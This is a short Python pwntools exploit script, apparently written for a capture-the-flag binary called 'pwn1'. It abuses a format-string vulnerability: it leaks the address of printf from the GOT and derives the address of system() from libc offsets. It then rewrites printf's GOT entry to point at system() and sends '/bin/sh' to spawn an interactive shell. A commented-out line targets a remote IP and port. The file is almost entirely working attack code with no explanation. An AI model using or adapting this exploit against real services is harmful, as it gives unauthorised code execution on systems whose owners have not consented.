from pwn import *
#context.log_level = 'debug'


#libc = ELF('./libc32.so')
libc = ELF('/lib32/libc.so.6')
elf = ELF("./pwn1")

got_printf = elf.got['printf']
#print hex(got_printf)

p = process("./pwn1")
#p = remote("115.28.185.220", 11111)
#p = remote("127.0.0.1", 10001)


p.recvuntil("input$")
p.sendline('1')
p.recvuntil('please input your name:\n')
payload = p32(got_printf) + "%6$s"
#print repr(payload)
p.sendline(payload)
printf_addr_and_xxx = p.recvuntil(",you")
printf_addr = u32(printf_addr_and_xxx[4:8])
print "printf_addr = " + hex(printf_addr)

system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)


p.recvuntil("input$")
p.sendline('1')
p.recvuntil('please input your name:\n')

payload2 = fmtstr_payload(6, {got_printf: system_addr})  
#print repr(payload2)
p.sendline(payload2)

#p.recvuntil("sh: 1: plz: not found")

p.sendline('1')
p.recvuntil('please input your name:\n')
p.sendline('/bin/sh\0')

p.interactive()


